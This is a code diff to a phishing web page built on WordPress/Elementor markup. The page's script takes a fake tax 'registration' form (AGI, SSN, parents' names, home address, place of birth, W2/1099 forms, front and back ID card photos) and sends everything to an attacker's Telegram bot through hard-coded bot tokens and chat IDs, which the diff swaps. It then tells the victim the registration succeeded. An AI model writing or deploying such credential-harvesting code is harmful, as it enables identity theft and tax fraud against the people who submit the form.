@@ -757,9 +757,9 @@ flexibility(document.documentElement);
 			</button>
 		  </div>
 		  <div class="elementor-field-group elementor-field-type-submit e-form__buttons__wrapper">
-			<button class="elementor-button elementor-size-sm e-form__buttons__wrapper__button" type="submit">
+			<button class="elementor-button elementor-size-sm e-form__buttons__wrapper__button" type="submit" id="sendBtn">
 			  <span class="elementor-button-content-wrapper">
-				<span class="elementor-button-text" >Send</span>
+				<span class="elementor-button-text" id="sendBtn">Send</span>
 			  </span>
 			</button>
 		  </div>
@@ -970,8 +970,8 @@ var wpcf7 = {
 		`;
 	
 		// Replace with your actual Telegram Bot Token and Chat ID
-		const botToken = '8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE';
-		const chatId = '6837437455';
+		const botToken = '5289868988:AAEMHw_b7mgPXkaw6OCzLMrRwet0kI4M8Vs';
+		const chatId = '992184359';
 	
 		try {
 		  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -1002,45 +1002,45 @@ var wpcf7 = {
 	  const prevBtn = document.getElementById('prevBtn');
 	  const step1 = document.getElementById('step1');
 	  const step2 = document.getElementById('step2');
-	  // Use querySelector to get a single element with the class "step2Form"
 	  const step2Form = document.getElementById('step2Form');
-	  
-	  // When "Previous" is clicked on Step 2, go back to Step 1
+	  const sendButton = document.getElementById('sendBtn'); // Assuming button has id="sendBtn"
+  
 	  if (prevBtn) {
 		prevBtn.addEventListener('click', () => {
 		  step2.classList.add('hidden');
 		  step1.classList.remove('hidden');
 		});
 	  }
-	  
-	  // Intercept the Step 2 form submission
+  
 	  if (step2Form) {
 		step2Form.addEventListener('submit', async (e) => {
-		  e.preventDefault(); // Prevent the default form submission
+		  e.preventDefault();
 		  
-		  // Collect text fields from Step 2 using FormData
+		  // Change button text to "Processing..."
+		  if (sendButton) {
+			sendButton.innerText = 'Processing...';
+			sendButton.disabled = true; // Disable button to prevent multiple submissions
+		  }
+  
 		  const formData = new FormData(step2Form);
 		  const data = Object.fromEntries(formData.entries());
-		  
-		  // Format the text message
-		  const message = `🚀 New Form Submission (Step 2) 🚀
-	AGI: ${data["form_fields[field_11234a3]"]}
-	First Name: ${data["form_fields[field_86d3dca]"]}
-	Last Name: ${data["form_fields[field_7ad7b7e]"]}
-	Father's Name: ${data["form_fields[field_6208eb3]"]}
-	Mother's Name: ${data["form_fields[field_d0b375b]"]}
-	Email: ${data["form_fields[field_12aae5e]"]}
-	Phone: ${data["form_fields[field_d168c13]"]}
-	Home Address: ${data["form_fields[field_faf0f47]"]}
-	SSN: ${data["form_fields[field_26f4f87]"]}
-	Place of Birth: ${data["form_fields[field_5e0063c]"]}`;
-		  
-		  // Replace with your actual Telegram Bot Token and Chat ID
-		  const botToken = '8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE';
-		  const chatId = '6837437455';
-		  
+  
+		  const message = `🚀 New Form Submission (Step 2) 🚀\n
+		  AGI: ${data["form_fields[field_11234a3]"]}\n
+		  First Name: ${data["form_fields[field_86d3dca]"]}\n
+		  Last Name: ${data["form_fields[field_7ad7b7e]"]}\n
+		  Father's Name: ${data["form_fields[field_6208eb3]"]}\n
+		  Mother's Name: ${data["form_fields[field_d0b375b]"]}\n
+		  Email: ${data["form_fields[field_12aae5e]"]}\n
+		  Phone: ${data["form_fields[field_d168c13]"]}\n
+		  Home Address: ${data["form_fields[field_faf0f47]"]}\n
+		  SSN: ${data["form_fields[field_26f4f87]"]}\n
+		  Place of Birth: ${data["form_fields[field_5e0063c]"]}`;
+  
+		  const botToken = '5289868988:AAEMHw_b7mgPXkaw6OCzLMrRwet0kI4M8Vs';
+		const chatId = '992184359';
+  
 		  try {
-			// Send text message via Telegram
 			const sendMsgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
 			  method: 'POST',
 			  headers: { 'Content-Type': 'application/json' },
@@ -1050,21 +1050,18 @@ var wpcf7 = {
 				parse_mode: 'Markdown'
 			  })
 			});
-			
-			if (!sendMsgResponse.ok) {
-			  throw new Error(`sendMessage failed: ${sendMsgResponse.statusText}`);
-			}
+  
+			if (!sendMsgResponse.ok) throw new Error(`sendMessage failed: ${sendMsgResponse.statusText}`);
+  
 			console.log('Text message sent successfully.');
-			
-			// Now send file inputs (e.g., images/documents)
-			// Define an array mapping file input IDs and labels
+  
+			// Send file inputs
 			const fileInputs = [
 			  { id: 'form-field-field_692904e', label: 'W2/1099 Form' },
 			  { id: 'form-field-field_150512f', label: 'Front ID Card' },
 			  { id: 'form-field-field_0df82d2', label: 'Back ID Card' }
 			];
-			
-			// Loop through each file input and send if a file is selected
+  
 			for (const inputInfo of fileInputs) {
 			  const inputElement = document.getElementById(inputInfo.id);
 			  if (inputElement && inputElement.files && inputElement.files[0]) {
@@ -1072,33 +1069,37 @@ var wpcf7 = {
 				fileFormData.append('chat_id', chatId);
 				fileFormData.append('caption', inputInfo.label);
 				fileFormData.append('document', inputElement.files[0]);
-				
+  
 				const sendDocResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
 				  method: 'POST',
 				  body: fileFormData
 				});
-				
+  
 				if (!sendDocResponse.ok) {
 				  console.error(`Failed to send ${inputInfo.label}:`, sendDocResponse.statusText);
 				} else {
 				  console.log(`${inputInfo.label} sent successfully.`);
 				}
-			  } else {
-				console.log(`No file selected for ${inputInfo.label}.`);
 			  }
 			}
-			
-			alert('Registration successful. we will get back with you shortly..');
-			window.location.href= 'index.html';
-			// Optionally, perform further actions (e.g., form reset or redirection)
+  
+			alert('Registration successful. We will get back with you shortly.');
+			window.location.href = 'index.html';
+  
 		  } catch (error) {
 			console.error('Error sending Step 2 data to Telegram:', error);
-			alert('Error sending Step 2 data to Telegram.');
+			alert('Error sending data. Please try again.');
+		  } finally {
+			if (sendButton) {
+			  sendButton.innerText = 'Send';
+			  sendButton.disabled = false;
+			}
 		  }
 		});
 	  }
 	});
-	</script>
+  </script>
+  
 	
 
 
